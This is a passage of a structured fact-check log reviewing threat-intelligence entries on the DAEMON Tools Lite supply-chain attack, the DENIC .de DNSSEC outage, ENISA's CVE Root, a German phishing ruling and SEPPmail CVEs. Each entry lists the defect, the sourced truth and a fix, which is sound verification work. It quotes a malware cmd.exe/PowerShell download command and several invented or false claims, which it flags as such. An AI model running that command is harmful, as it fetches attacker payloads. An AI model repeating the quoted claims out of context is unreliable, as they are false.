- entry: 2026-05-09/daemon-tools-lite-supply-chain-quic-rat-deployed-via-signed
  verdict: factual-error
  mostly_unsupported: false
  defects:
  - where: title, headline
    claim: QUIC RAT deployed via signed installer; EU governments among targeted victims
    defect: No EU government target is reported. The targeted second-stage payloads reached about a dozen government, scientific, manufacturing and retail organisations 'located in Russia, Belarus, and
      Thailand'; QUIC RAT itself reached one educational institution in Russia. Germany, France, Spain and Italy appear only among the top countries of infection attempts, which were mostly home users (about
      10% of systems were organisations').
    ground_truth: the other backdoor payload, which is more complex, has been observed only on a dozen machines of government, scientific, manufacturing, and retail organizations located in Russia, Belarus,
      and Thailand.
    ground_truth_url: https://securelist.com/daemon-tools-backdoor/119654/
    fix: 'Retitle: ''DAEMON Tools Lite supply-chain compromise: signed trojanized installers since 2026-04-08; targeted payloads limited to about a dozen organisations in Russia, Belarus and Thailand''.
      Drop the EU-government claim, the ''china-nexus'' tag (only Chinese-language strings; no attribution) and re-test the priority.'
    class: factual-error
  - where: body sentence 3 (QUIC RAT capabilities)
    claim: QUIC RAT, an advanced implant that injects into notepad.exe and conhost.exe, supports C2 over QUIC (evading proxy inspection), and implements shell execution, file management, process injection,
      keylogging, SOCKS proxy, and TCP tunnelling
    defect: Securelist states only that QUIC RAT is C++, obfuscated with control-flow flattening, statically linked with WolfSSL, embeds msquic.dll, supports HTTP, UDP, TCP, WSS, QUIC, DNS and HTTP/3 for
      C2, and can inject payloads into notepad.exe and conhost.exe; 'analysis is still ongoing'. The shell execution, file management, keylogging, SOCKS proxy, tunnelling and proxy-evasion statements are
      not in any cited source (the shell/download/shellcode features belong to the separate minimalistic backdoor).
    ground_truth: This backdoor supports a variety of C2 communication protocols, including HTTP, UDP, TCP, WSS, QUIC, DNS and HTTP/3. While its analysis is still ongoing, we have identified that QUIC RAT
      is able to inject payloads into notepad.exe and conhost.exe processes.
    ground_truth_url: https://securelist.com/daemon-tools-backdoor/119654/
    fix: Replace with the sourced capabilities; attribute shell/file download/shellcode execution to the minimalistic backdoor.
    class: factual-error
  - where: body sentence 5
    claim: Targeted QUIC RAT deployment was limited to approximately a dozen machines in government, scientific, manufacturing, and retail sectors — indicating selective activation consistent with intelligence-collection
      objectives.
    defect: The dozen machines received the minimalistic backdoor; QUIC RAT was seen once, at a Russian educational institution. Kaspersky says the intent (cyberespionage or big-game hunting) is unclear,
      so 'consistent with intelligence-collection objectives' contradicts the source.
    ground_truth: their intent — whether it is cyberespionage or big game hunting — is currently unclear.
    ground_truth_url: https://securelist.com/daemon-tools-backdoor/119654/
    fix: 'Say: minimalistic backdoor on about a dozen organisations in RU/BY/TH; QUIC RAT on one Russian educational institution; intent unclear.'
    class: factual-error
  - where: body ATT&CK coverage line
    claim: T1036.004 Masquerade Task or Service (kworker/ksoftirqd masquerade); T1573.002 Asymmetric Cryptography / QUIC
    defect: No Linux kworker/ksoftirqd masquerade is described anywhere (the implants are Windows); the id list is also a bare prose list. T1573.002 is not tied to QUIC by any source (WolfSSL and msquic.dll
      are mentioned, protocol list otherwise).
    ground_truth: This RAT is coded in C++, obfuscated with control flow flattening and statically linked with the WolfSSL library. It also includes the body of the legitimate msquic.dll library in its
      .data section.
    ground_truth_url: https://securelist.com/daemon-tools-backdoor/119654/
    fix: Delete T1036.004 and the masquerade parenthesis; move supported ids to techniques[] (see supported_techniques).
    class: factual-error
  - where: body sentence 6
    claim: The clean release is version 12.6.0.2445 (released 2026-05-06).
    defect: The vendor says version 12.6 was released on May 5 (within 12 hours of notification at about 07:00 GMT on May 5); the vendor's blog post is dated 2026-05-06.
    ground_truth: Version 12.6 of DAEMON Tools Lite, which does not contain the suspected compromised files, was released on May 5.
    ground_truth_url: https://blog.daemon-tools.cc/eng/post/security-incident
    fix: Change to 2026-05-05 and cite the vendor post.
    class: imprecision
  - where: Defender takeaway (detection lines)
    claim: outbound QUIC (UDP 443) to non-sanctioned destinations. Sysmon EID 1 with parent-process image path filters for notepad.exe or conhost.exe spawning child processes will surface post-injection
      activity.
    defect: Derived, not sourced. QUIC is one of seven C2 protocols QUIC RAT supports, and the primary observable in every source is the trojanized signed installer with a startup beacon (GET to a typosquat
      of daemon-tools.cc, then PowerShell WebClient download to C:\Windows\Temp). Process-creation detection of the PowerShell/cmd child of the DAEMON Tools helper binaries (DTHelper.exe, DiscSoftBusServiceLite.exe,
      DTShellHlp.exe) is the sourced behavior.
    ground_truth: In response to the requests sent, the server may return a shell command to be executed through the cmd.exe process. ... cmd.exe /c powershell -NoProfile -Command "$wc=New-Object System.Net.WebClient;$wc.DownloadFile(...)"
    ground_truth_url: https://securelist.com/daemon-tools-backdoor/119654/
    fix: Lead the detection with DAEMON Tools helper binaries spawning cmd.exe/powershell and downloading executables; keep version check; drop the notepad/conhost parent-process rule.
    class: imprecision
  - where: summary
    claim: QUIC RAT delivered via signed, legitimate-looking Lite installer since 8 April 2026 ... (Kaspersky Securelist, 2026-05-05 updated 2026-05-08)
    defect: The trojanized installers have circulated since 8 April; QUIC RAT was delivered once. Kaspersky's blog (2026-05-05) carries an update note dated 'March 6' (a typo) about the vendor fix; no 2026-05-08
      update is visible. The entry cites Kaspersky's blog while calling it Securelist; the technical write-up is the separate Securelist post.
    ground_truth: Securelist 'Popular DAEMON Tools software compromised' (Igor Kuznetsov et al.) and Kaspersky blog 'Supply chain attack via DAEMON Tools' dated 2026-05-05.
    ground_truth_url: https://securelist.com/daemon-tools-backdoor/119654/
    fix: Cite the Securelist article as primary and the blog/HNS/The Record as corroboration; fix dates.
    class: imprecision
  verified_core:
  - fact: 'Kaspersky (Securelist, Igor Kuznetsov, Georgy Kucherin, Leonid Bezvershenko, Anton Kargin; blog 2026-05-05): DAEMON Tools Lite installers (12.5.0.2421 to 12.5.0.2434) trojanized from 2026-04-08,
      signed with AVB Disc Soft certificates, distributed from the legitimate site; trojanized binaries DTHelper.exe, DiscSoftBusServiceLite.exe, DTShellHlp.exe beacon at startup (GET to a typosquat of
      daemon-tools.cc registered 2026-03-27) and run shell commands returned by the server; attack ongoing at publication'
    source_url: https://securelist.com/daemon-tools-backdoor/119654/
    passage: Whenever one of these binaries is launched, which happens at startup, a backdoor gets activated.
  - fact: 'Stages: .NET information collector envchk.exe (MAC, hostname, DNS domain, process and installed-software lists, locale; Chinese-language strings but no attribution); minimalistic backdoor (RC4-decrypted
      shellcode loader; downloads files, runs shell commands, executes shellcode; deployed to about a dozen machines, partly by hand with typos); QUIC RAT (C++, WolfSSL, embedded msquic.dll, HTTP/UDP/TCP/WSS/QUIC/DNS/HTTP3
      C2, injects into notepad.exe and conhost.exe) against one educational institution in Russia'
    source_url: https://securelist.com/daemon-tools-backdoor/119654/
    passage: we identified QUIC RAT to be used against only one organization, an educational institution located in Russia.
  - fact: 'Victimology: several thousand infection attempts in 100+ countries, majority in Russia, Brazil, Turkey, Spain, Germany, France, Italy, China; ~10% of affected systems organisations; further payloads
      only on a dozen machines of government, scientific, manufacturing and retail organisations in Russia, Belarus and Thailand; intent unclear (cyberespionage or big game hunting); detection took about
      a month (comparable to 3CX); Kaspersky telemetry is geographically limited (HNS)'
    source_url: https://securelist.com/daemon-tools-backdoor/119654/
    passage: However, their intent — whether it is cyberespionage or big game hunting — is currently unclear.
  - fact: 'Vendor (Disc Soft, blog 2026-05-06): unauthorized interference in its build environment; only DAEMON Tools Lite affected; notified ~07:00 GMT 2026-05-05, version 12.6 (12.6.0.2445) released 2026-05-05;
      affected 12.5.x removed; no third-party attribution; The Record quotes Disc Soft that it has not identified evidence all users were impacted'
    source_url: https://blog.daemon-tools.cc/eng/post/security-incident
    passage: Version 12.6 of DAEMON Tools Lite, which does not contain the suspected compromised files, was released on May 5.
  supported_techniques:
  - 'T1195.002 Compromise Software Supply Chain: trojanized signed installers distributed from the vendor site (vendor confirms build-environment compromise)'
  - 'T1059.001 PowerShell and T1105 Ingress Tool Transfer: server-returned cmd.exe/powershell WebClient download of payloads'
  - 'T1082 System Information Discovery, T1057 Process Discovery, T1518 Software Discovery: information collector gathers hostname, processes, installed software, locale'
  - 'T1055 Process Injection: QUIC RAT injects payloads into notepad.exe and conhost.exe'
  - 'T1573 Encrypted Channel / T1071.001 Web Protocols: multi-protocol C2 (HTTP, WSS, QUIC, HTTP/3 ...), with WolfSSL'
  - 'T1620 Reflective Code Loading: minimalistic backdoor RC4-decrypts and runs shellcode in memory'
  notes: Priority high rests on the EU-government claim; sourced nexus for a Swiss public-sector SOC is generic supply-chain exposure (consumer/IT software used on admin workstations), not a targeted EU
    campaign. No techniques[] in frontmatter; the id list is in prose.
- entry: 2026-05-09/denic-de-dnssec-outage-faulty-key-rollover-3-5-h-disruption
  verdict: factual-error
  mostly_unsupported: false
  defects:
  - where: summary, body sentence 1, 2026-05-10 section paragraph 3 (times)
    claim: On 2026-05-05 at 21:43 UTC ... roughly 3.5 hours; DENIC restored service by 01:15 UTC on 2026-05-06; The outage ran 2026-05-05 21:43 UTC → 2026-05-06 ~01:15 UTC (~3.5 h)
    defect: 'The times are local German time, not UTC. heise: ''Am 5. Mai um 21:43'' (CEST); DENIC: incident ''from 21:57 onwards'', correct zone distributed 00:08, fully restored 01:15 (CEST); Cloudflare
      measured the start at roughly 19:30 UTC (SERVFAIL spike) and its mitigation ended impact at 22:17 UTC. DENIC states the restriction lasted ''approximately three hours''. The cited DENIC post-incident
      page is dated 2026-05-06, not 2026-05-08 as the label says.'
    ground_truth: On May 5, 2026, at roughly 19:30 UTC, DENIC, the registry operator for the .de country-code top-level domain (TLD), started publishing incorrect DNSSEC signatures for the .de zone.
    ground_truth_url: https://blog.cloudflare.com/de-tld-outage-dnssec/
    fix: State 'about 19:30-19:57 UTC (21:30-21:57 CEST) to 23:15 UTC (01:15 CEST), about 3 to 3.5 hours' and cite the dated sources; correct the post-incident report label to 2026-05-06.
    class: factual-error
  - where: body sentence 3
    claim: Cloudflare deployed a Negative Trust Anchor under RFC 7646 for its resolvers within ~90 minutes. Crucially, .ch was unaffected (heise online, 2026-05-08 · Cloudflare blog).
    defect: Cloudflare rolled its mitigation out at 22:17 UTC, about 2 h 47 min after the 19:30 UTC start, and used an existing override rule marking .de insecure, 'functionality equivalent to an NTA, though
      not formally defined in any RFC'. Neither cited page (nor any DENIC page) mentions .ch or Switzerland, so 'Crucially, .ch was unaffected' is unsupported.
    ground_truth: We rolled out our mitigation at 22:17 UTC, which marked the end of impact for 1.1.1.1.
    ground_truth_url: https://blog.cloudflare.com/de-tld-outage-dnssec/
    fix: Say Cloudflare applied an NTA-equivalent override at 22:17 UTC; delete the .ch sentence (or source it, e.g. SWITCH/ NCSC-CH statement, if one exists).
    class: factual-error
  - where: body sentence 2 (root cause)
    claim: a software defect in DENIC's HSM integration code introduced during a March 2026 migration to Knot DNS generated three key pairs sharing keytag 33834
    defect: 'DENIC: the third generation of the signing system (standard Knot software plus in-house developments with HSMs) was put into operation in April 2026 (the entry''s own update says April); Knot
      was not newly migrated. The defect was in the in-house rollover agent, which generated one key pair per HSM instead of one pair loaded into all HSMs; the pairs carried identical identifiers including
      key tag 33834 (DENIC: ''not a classic key tag collision'').'
    ground_truth: In April 2026, the third generation of this system since the introduction of DNSSEC in 2011 was put into operation.
    ground_truth_url: https://blog.denic.de/en/final-report-dns-outage-of-5-may-2026/
    fix: 'Replace with: faulty rollover-agent code in DENIC''s in-house signing development (third generation, in service since April 2026) created a separate ZSK pair per HSM with identical key tag 33834;
      only one matching public key was published, so about a third of signatures validated.'
    class: factual-error
  - where: title, headline
    claim: 3.5 h disruption for German government and public-sector .de domains
    defect: 'No source singles out government or public-sector domains: every .de domain failed validation (invalid NSEC3 signatures also broke second-level domains without DNSSEC) for validating resolvers;
      non-validating resolvers were unaffected. ''approximately 18 million'' is not stated in any cited source.'
    ground_truth: Consequently, even second-level domains for which DNSSEC is not used at all could not be resolved. Non-validating resolvers, on the other hand, delivered the .de zone without issue.
    ground_truth_url: https://blog.denic.de/en/final-report-dns-outage-of-5-may-2026/
    fix: Retitle without the government/public-sector scope; say all .de domains behind validating resolvers; source or drop the 18 million figure.
    class: factual-error
  - where: 2026-05-10 section paragraph 3 and update record summary
    claim: the monitoring pipeline detected anomalous resolver behaviour but the alerting layer did not correctly forward the alerts — the SIEM-rule equivalent of a fire-but-don't-page failure; DENIC published
      its formal technical post-mortem on 2026-05-08
    defect: 'DENIC: three continuously running testing and validation tools applied to the zone detected the errors; the notifications were not processed correctly. They were not resolver-behaviour monitors.
      The 2026-05-08 ''Analyse'' is an interim analysis (it promises more technical details later, with an addendum on 2026-05-11); the formal Final Report is dated 2026-06-11.'
    ground_truth: These systems detected the errors as intended; however, the generated notifications were not processed correctly, meaning that no timely intervention took place.
    ground_truth_url: https://blog.denic.de/en/final-report-dns-outage-of-5-may-2026/
    fix: Describe the validation tools correctly; call the 05-08 text an interim analysis and add the Final Report (2026-06-11) with its measures (enhanced alerting, partial zone validation before deployment,
      ZSK rollovers suspended).
    class: imprecision
  - where: frontmatter
    claim: 'kind: threat; tags vulnerabilities; event_date 2026-05-08'
    defect: 'An operational registry incident with no attacker or vulnerability (DENIC: no signs of compromise); the incident date is 2026-05-05, 2026-05-08 is the analysis publication date.'
    ground_truth: 'Ruled-out causes: No signs of compromise or attacks on the signing system or other DENIC infrastructure.'
    ground_truth_url: https://blog.denic.de/en/final-report-dns-outage-of-5-may-2026/
    fix: event_date 2026-05-05; retype as incident/operational; drop vulnerabilities tag.
    class: imprecision
  verified_core:
  - fact: 'DENIC (.de registry): on the evening of 2026-05-05 invalid DNSSEC signatures were distributed during a routine ZSK rollover; validating resolvers treated .de responses as bogus (SERVFAIL); DENIC
      distributed a correct zone at 00:08 and had restored the prior state by 01:15 on 2026-05-06 (local time); restriction about three hours; some large resolver operators temporarily suspended validation
      for .de'
    source_url: https://blog.denic.de/en/technical-issue-with-de-domains-resolved/
    passage: At 00:08 on 6 May, DENIC initiated the distribution of a correct DNS zone. The operational status prior to the outage was fully restored by 01:15.
  - fact: 'Root cause (DENIC Final Report 2026-06-11): faulty code in the in-house rollover agent generated a separate ZSK pair per connected HSM (three, same identifiers incl. key tag 33834); only one
      matching public key in the DNSKEY RRset, so only about a third of RRSIGs validated; SOA partly valid, partly invalid; defect missed because the test environment has a single HSM; three validation
      tools detected it but notifications were not processed correctly; no attack, no Knot or HSM malfunction, no classic key-tag collision'
    source_url: https://blog.denic.de/en/final-report-dns-outage-of-5-may-2026/
    passage: This was therefore not a classic key tag collision, but rather three key pairs with different contents but identical metadata.
  - fact: 'Impact: invalid NSEC3 signatures made delegations bogus for validating resolvers, so even second-level domains without DNSSEC failed; non-validating resolvers unaffected; DENIC''s early statement
      that only DNSSEC-signed domains were affected was corrected (heise)'
    source_url: https://www.heise.de/news/DNS-Probleme-mit-de-Domains-DENIC-liefert-erste-Erklaerung-11288197.html
    passage: Ohne gültige NSEC3-Einträge scheiterte die DNSSEC-Prüfung für alle .de-Domains.
  - fact: 'Cloudflare (1.1.1.1): SERVFAIL spike from ~19:30 UTC climbing over three hours as caches expired; RFC 8767 serve-stale cushioned impact; mitigation at 22:17 UTC via an override marking .de insecure
      (NTA-equivalent), also applied to its origin resolver; EDE code bug (reported EDE 22 instead of EDE 6)'
    source_url: https://blog.cloudflare.com/de-tld-outage-dnssec/
    passage: We rolled out our mitigation at 22:17 UTC, which marked the end of impact for 1.1.1.1.
  - fact: 'DENIC follow-up measures: enhanced alerting, accelerated switchover to a valid zone backup, partial zone validation prior to deployment, ZSK rollovers suspended, external security and process
      analysis'
    source_url: https://blog.denic.de/en/final-report-dns-outage-of-5-may-2026/
    passage: 'Suspension of further ZSK rollovers: Suspension of a further ZSK rollover until the completion of further measures'
  supported_techniques:
  - 'none: DENIC rules out compromise or attack; this is an operational DNSSEC failure, so no ATT&CK technique applies (techniques: [] is correct)'
  notes: Defender takeaways (keep NTA capability for registry incidents; DNSSEC failures look identical to attacks at the resolver) are supported by the Cloudflare write-up. Source list lists the German
    DENIC analysis and heise as 'primary'/'corroborating' correctly except labels. Entry has no classification block.
- entry: 2026-05-09/enisa-expands-cve-root-four-new-european-organisations-onboa
  verdict: factual-error
  mostly_unsupported: false
  defects:
  - where: body sentence 4 and entities[]
    claim: 'This is part of the EU Cyber Resilience Act (CRA) implementation framework: the CRA designates ENISA as the EU-level coordination body for harmonised vulnerability reporting, and the CVE Root
      transfer is the operational mechanism. (entity campaign:eu-cyber-resilience-act)'
    defect: The cited ENISA press release does not mention the CRA. It places the CVE Root role in ENISA's support to the CSIRTs Network (ENISA became CVE Root for European entities in November 2025, serving
      national and EU authorities and CSIRTs Network members) and refers to proposed capacity in the Cybersecurity Act 2. Calling the CVE Root transfer the CRA's 'operational mechanism' is the entry's own
      claim.
    ground_truth: ENISA became a CVE Root for European entities in November 2025. As such, ENISA serves as the central point of contact within the CVE Program for national and EU authorities, EU CSIRTs
      Network members, and cooperative partners under ENISA's mandate.
    ground_truth_url: https://www.enisa.europa.eu/news/new-cve-numbering-authorities-under-enisa-root
    fix: Delete the CRA sentence and the campaign:eu-cyber-resilience-act entity, or cite a CRA source and label it context; keep 'ENISA became CVE Root in November 2025'.
    class: factual-error
  - where: body last sentence
    claim: an increasing proportion of EU-discovered CVEs will be assigned and initially coordinated through ENISA-supervised channels, which may affect advisory publication timing and format compared to
      MITRE Root coordination — particularly for products made by EU software vendors
    defect: Uncited speculation; the press release says the aim is more consistent, timely and coordinated vulnerability identification across Europe, gives no effect on advisory format or vendor-specific
      impact, and stresses ENISA is 'reinforcing, rather than fragmenting' the CVE backbone.
    ground_truth: It also reflects ENISA's wider objective of reinforcing, rather than fragmenting, the shared global vulnerability identifier backbone on which governments, vendors, researchers, and defenders
      rely.
    ground_truth_url: https://www.enisa.europa.eu/news/new-cve-numbering-authorities-under-enisa-root
    fix: Delete the sentence or mark it explicitly as the analyst's judgement.
    class: imprecision
  verified_core:
  - fact: 'ENISA press release dated 2026-05-06: four organisations newly joined the CVE Program as CNAs under ENISA Root (trained and onboarded by ENISA, names not given); seven CNAs have already moved
      from MITRE Root to ENISA Root (11 in total); several more requested onboarding in the coming weeks; over 90 European CNAs could transfer voluntarily out of 510 CNAs from 42 countries and 1 without
      country; ENISA became CVE Root for European entities in November 2025 (scope: national and EU authorities, CSIRTs Network members, cooperative partners; recruits, onboards, trains, supports and manages
      CNAs; ensures CVE ID assignment and record publication)'
    source_url: https://www.enisa.europa.eu/news/new-cve-numbering-authorities-under-enisa-root
    passage: currently, seven CNAs have moved from MITRE Root to ENISA Root, in addition to the four new CNAs in the Program.
  supported_techniques:
  - 'none: policy/program announcement, no attacker behavior (techniques not applicable)'
  notes: The headline/summary/figures are accurate. Relevance for the Swiss constituency is low (Switzerland is not under ENISA Root); entry has no classification block; single-source-national-cert fits.
- entry: 2026-05-09/german-court-finds-bank-liable-for-sophisticated-phishing-lo
  verdict: factual-error
  mostly_unsupported: false
  defects:
  - where: headline and body sentences 3-4
    claim: PSD2/IP-analytics obligations clarified ... the ruling found the bank's fraud-detection systems failed to act ... The court treated this as an obligation under Germany's PSD2 implementation —
      specifically, a duty to apply IP-based behavioural analytics and trigger a strong-customer-authentication challenge when registration and first-use IPs diverge.
    defect: heise (the primary) reports the IP discrepancy only in the chamber's remarks 'über die Entscheidung hinaus' (beyond the decision), where the chamber 'deutet ... Ansätze für notwendige Früherkennungssysteme
      an' (hints at approaches); it names no PSD2 or ZAG provision and no strong-customer-authentication duty. The claimant's lawyer calls the court's technical view 'technisch noch laienhaft'. The holding
      is that the customer was not grossly negligent, so the bank had to reimburse.
    ground_truth: 'Bemerkenswert sind die Ausführungen des Gerichts über die Entscheidung hinaus. Die Kammer deutet darin Ansätze für notwendige Früherkennungssysteme an: Die Bank hätte den Betrug erkennen
      und unterbinden können, da die Einwahl des Kunden und die gleichzeitige Registrierung eines neuen Geräts durch die Täter über vollkommen unterschiedliche IP-Adressen und Provider erfolgten.'
    ground_truth_url: https://www.heise.de/news/Urteil-gegen-die-Apobank-Finanzinstitut-haftet-fuer-Phishing-Schaden-11288231.html
    fix: 'Retitle: ''German court orders Apobank to refund phishing loss; no gross negligence; chamber remarks that IP divergence at device registration should have been blocked (obiter)''. Delete the PSD2
      / SCA-duty statement.'
    class: factual-error
  - where: summary and body sentence 1 (amount, citations)
    claim: €218,000+ ... (heise online ... · ilex Rechtsanwälte — case summary)
    defect: heise says 'über 200.000 Euro'; the exact EUR 218,000 and 'not yet final' come from another outlet (borncity, uncited). The cited anwalt.de page returned HTTP 403 on every transport tried (direct,
      WebFetch, jina), so its support is unverifiable; the summary text is also truncated mid-sentence ('and …').
    ground_truth: Das Landgericht Berlin II entschied am 22. April 2026 (Az. 38 O 293/25), dass die Bank die 218.000 Euro nicht wegen grober Fahrlässigkeit des Kunden verweigern darf. ... Das noch nicht
      rechtskräftige Urteil
    ground_truth_url: https://borncity.com/news/landgericht-berlin-ii-verurteilt-apobank-zu-218-000-euro-rueckzahlung/
    fix: Add borncity (or the judgment) as the source for 218,000 and non-finality; complete the truncated summary; remove the unreadable anwalt.de citation or replace it.
    class: imprecision
  - where: last sentence
    claim: 'For EU/Swiss financial-sector and public-sector digital-service providers: this reinforces the trend of courts placing authentication-failure liability on service providers when fraud signals
      are present in server-side telemetry but not acted on.'
    defect: Uncited generalisation; the sources show German courts (OLG Koblenz, BGH 22 July 2025 XI ZR 107/24) setting a high bar for customer gross negligence, not a general liability trend for unheeded
      server-side signals, and say nothing about Swiss or public-sector providers.
    ground_truth: 'Der BGH stellte am 22. Juli 2025 (Az. XI ZR 107/24) klar: Die Anforderungen an den Nachweis grober Fahrlässigkeit sind hoch.'
    ground_truth_url: https://borncity.com/news/landgericht-berlin-ii-verurteilt-apobank-zu-218-000-euro-rueckzahlung/
    fix: Delete or mark as the analyst's inference; note the Swiss constituency has no nexus beyond the lure pattern.
    class: imprecision
  verified_core:
  - fact: Landgericht Berlin II, Zivilkammer 38, judgment of 2026-04-22 (Az. 38 O 293/25), ordered Apobank (Deutsche Apotheker- und Ärztebank) to reimburse an unauthorised loss of over EUR 200,000 (EUR
      218,000 per borncity; customer's statutory EUR 50 share); judgment not yet final (borncity); heise published 2026-05-08, lawyer Ulrich Schulte am Hülse (Ilex Rechtsanwälte) won the case
    source_url: https://www.heise.de/news/Urteil-gegen-die-Apobank-Finanzinstitut-haftet-fuer-Phishing-Schaden-11288231.html
    passage: entschied das Gericht, dass das Finanzhaus für einen unautorisierten Schaden von über 200.000 Euro haften muss.
  - fact: 'Attack pattern: postal letter in the bank''s name announcing a new security procedure (2FA/new device; QR code to a manipulated near-identical banking page per borncity), manipulated online-banking
      interface reached via the customer''s usual favourites link, call from a purported bank employee under the bank''s official number who knew details of other accounts; the customer photographed codes
      from the screen and passed no PIN or TAN; the attackers registered their own device'
    source_url: https://www.heise.de/news/Urteil-gegen-die-Apobank-Finanzinstitut-haftet-fuer-Phishing-Schaden-11288231.html
    passage: Im Weiteren fotografierte die Klägerin lediglich Codes vom Bildschirm ab, ohne sensible Autorisierungsdaten wie PINs oder TANs aktiv an die Anruferin zu übermitteln.
  - fact: 'Holding: customers do not act with gross negligence in such a near-perfectly staged deception; obiter: login by the customer and device registration by the attackers came from completely different
      IP addresses and providers and the bank allowed linking the new device without sufficient possession check; heise notes OLG Koblenz points the same way on gross negligence'
    source_url: https://www.heise.de/news/Urteil-gegen-die-Apobank-Finanzinstitut-haftet-fuer-Phishing-Schaden-11288231.html
    passage: Das Finanzhaus habe diese offensichtliche Diskrepanz nicht durch automatisierte Sicherheitsmechanismen blockiert und die Verknüpfung des neuen Geräts ohne hinreichende Besitzprüfung zugelassen.
  supported_techniques:
  - 'T1566.003 / vishing: no active id fits exactly; letter + QR lure is T1566 (Phishing) and the call is T1566.004 Spearphishing Voice; T1056.003 Web Portal Capture / T1185 do not apply to the sourced
    behavior; T1098.005 Device Registration: attackers registered their own device on the victim''s banking account'
  notes: 'Kind research; no techniques[]; no classification. Relevance for the Swiss public-sector SOC is low: a German consumer-banking liability ruling; the transferable element is the multi-channel lure
    with device registration and IP divergence as a detection signal.'
- entry: 2026-05-09/seppmail-secure-email-gateway-cvss-9-3-unauthenticated-rce-c
  verdict: factual-error
  mostly_unsupported: true
  defects:
  - where: 'body: CVE-2026-44128 / 44125 / 44126 / 44127 / 44129 sections (technical architecture and exploitation paths)'
    claim: GINAv2 is a Java EE–based web application deployed on a Tomcat servlet container ... a test/diagnostic HTTP servlet (`/gina/diag/exec`) ... invoke `Runtime.exec()` ... REST API (`/gina/api/v1/admin/`)
      ... `GINA_SESSION` ... `/admin/logs/view?file=` ... Freemarker
    defect: 'Invented. The appliance code InfoGuard analysed is Perl on an OpenBSD-style system (store_attachments, Perl eval, syslogd/newsyslog, user nobody); the CNA records place the flaws in the new
      GINA UI (44128: endpoint passing a parameter to Perl eval, THN: /api.app/template, parameter upldd; 44127: /api.app/attachment/preview, parameter identifier; 44125/44126/44129/7864: unauthenticated
      endpoints of the new GINA UI). No source mentions Tomcat, Java, Freemarker, /gina/diag, /gina/api/v1/admin, GINA_SESSION, gina.properties, web.xml, /var/seppmail paths, a ''seppmail'' user or Commons
      Collections.'
    ground_truth: SEPPmail Secure Email Gateway before version 15.0.2.1 allows unauthenticated remote code execution in the new GINA UI because an endpoint passes attacker-controlled input from a parameter
      to Perl's eval.
    ground_truth_url: https://cveawg.mitre.org/api/cve/CVE-2026-44128
    fix: Rewrite the per-CVE sections from the CNA records, THN and InfoGuard; delete every invented path, component and exploitation step.
    class: factual-error
  - where: 'body: Vulnerability Cluster Overview table'
    claim: CVE-2026-44127 | Appliance management | 8.8 | LFI + arbitrary file deletion | Low-privilege auth; CVE-2026-44129 | GINAv2 — template rendering | 8.3 | Server-side template injection | Low-privilege
      auth; CVE-2026-7864 | Appliance management | 6.9 | Information disclosure | Low-privilege auth; CVE-2026-44125 | admin REST API | Missing authentication; CVE-2026-44126 | session deserialisation |
      None (cookie-supplied)
    defect: 'Scores are right (CVSS 4.0) but component and authentication columns are wrong: 44127, 44129 and 7864 are all unauthenticated (PR:N) flaws in the new GINA UI / api.app, not admin-console or
      low-privilege issues; 44125 is missing authorization on multiple GINA UI endpoints (CWE-862) rather than an admin REST API; 44126''s trigger is a crafted serialized object reachable from the GINA
      UI, not a cookie.'
    ground_truth: 'CVE-2026-7864: SEPPmail Secure Email Gateway before version 15.0.4 exposes server environment variables through an unauthenticated endpoint in the new GINA UI'
    ground_truth_url: https://cveawg.mitre.org/api/cve/CVE-2026-7864
    fix: Correct the Component/Auth columns from the CNA records; state that all six NCSC CVEs are unauthenticated.
    class: factual-error
  - where: headline paragraph, summary, 'Vulnerability Cluster Overview', 'Hardening'
    claim: 'Status: Patch available (v15.0.4 / 15.0.4.1) ... all patched in SEPPmail 15.0.4 (patch 15.0.4.1) ... Upgrade to SEPPmail 15.0.4 (patch 15.0.4.1) — addresses all six CVEs. The hotfix is available
      via the standard SEPPmail update mechanism'
    defect: 15.0.4 (2026-04-24) carries the fixes; 15.0.4.1 (2026-04-28) is a later hotfix for other issues (waitpid, ruleset). 44128 was fixed in 15.0.2.1 and 44126 in 15.0.3 per InfoGuard.
    ground_truth: 'Release Date: April 24th, 2026 SEPPmail version: 15.0.4 ... Release Date: April 28th, 2026 SEPPmail version: 15.0.4.1'
    ground_truth_url: https://downloads.seppmail.com/extrelnotes/150/ERN15.0.html
    fix: Say fixed in 15.0.4; drop 'patch 15.0.4.1' and the 'hotfix ... update mechanism' sentence.
    class: factual-error
  - where: 'body: Detection Concepts and Hardening and Remediation'
    claim: '`auditctl -a always,exit ... -F uid=seppmail` ... Tomcat access log `/var/log/seppmail/access_log...` ... WAF rule blocking `/gina/diag/` and `/gina/api/v1/admin/` ... TCP/8443 admin console
      ... Confirm that `/gina/diag/exec` returns HTTP 403 or 404 ... Register for SEPPmail''s security notification list (security@seppmail.com)'
    defect: 'All paths, users, ports, log files and verification endpoints are invented, and the appliance is an OpenBSD-style virtual appliance on which InfoGuard notes ''the Blue Teams have usually no
      visibility''; the verification steps would pass or fail on endpoints that do not exist. The detection that follows the sources is: unusual requests to /v1/file.app containing ''../'', unexpected processes
      spawned by syslogd, and unexpected changes to /etc/syslog.conf (InfoGuard PoC), plus LFT exposure check (404 on /v1/file.app).'
    ground_truth: On these virtual appliances the Blue Teams have usually no visibility.
    ground_truth_url: https://labs.infoguard.ch/posts/seppmail_secure_e-mail_gateway_rce_vulnerabilities_cve-2026-2743_cve-2026-7864_cve-2026-44127_cve-2026-44128/
    fix: Replace both sections with the sourced indicators and the patch to 15.0.4 or later; delete the invented hardening steps.
    class: factual-error
  - where: 'body: MITRE ATT&CK Mapping and ''Swiss and DACH Deployment Context'''
    claim: T1078.001 Default Accounts (44125); T1552.001 key material from gina.properties; T1602 admin API config export; T1059.007 Server-Side Template Injection; T1070.002 audit-log clearing; ... ISBB
